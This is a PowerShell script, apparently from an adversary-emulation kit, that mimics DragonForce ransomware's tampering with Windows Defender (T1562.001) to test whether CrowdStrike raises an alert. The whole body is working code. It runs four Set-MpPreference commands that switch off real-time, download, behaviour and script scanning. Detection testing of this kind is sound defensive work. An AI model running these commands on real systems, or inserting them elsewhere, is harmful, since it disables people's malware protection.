<#
.SYNOPSIS
    DragonForce Windows Defender Disable - DETECTION TRIGGER
.DESCRIPTION
    Disables Windows Defender real-time monitoring.
    Will trigger EDR detection for T1562.001.
    REQUIRES ADMIN PRIVILEGES.
    TTP: T1562.001
#>
Write-Host "[*] Starting DragonForce Defender Disable (T1562.001)" -ForegroundColor Cyan
Write-Host "[*] This will trigger EDR detection for defense evasion" -ForegroundColor Yellow

try {
    # Check if running as admin
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-Host "[!] WARNING: Not running as Administrator" -ForegroundColor Red
    }
    
    # ACTUAL DETECTION TRIGGER - Multiple Defender disable methods
    Write-Host "[*] Method 1: Set-MpPreference -DisableRealtimeMonitoring"
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    
    Write-Host "[*] Method 2: Set-MpPreference -DisableIOAVProtection"
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    
    Write-Host "[*] Method 3: Set-MpPreference -DisableBehaviorMonitoring"
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    
    Write-Host "[*] Method 4: Set-MpPreference -DisableScriptScanning"
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    
    Write-Host "[+] SUCCESS: Defender disable commands executed" -ForegroundColor Green
    Write-Host "[!] CrowdStrike should detect: 'DefenderDisabled' or 'SecurityToolTampering'" -ForegroundColor Magenta
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}

Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
Write-Host "[!] IMPORTANT: Run the REVERT script to restore Defender!" -ForegroundColor Red
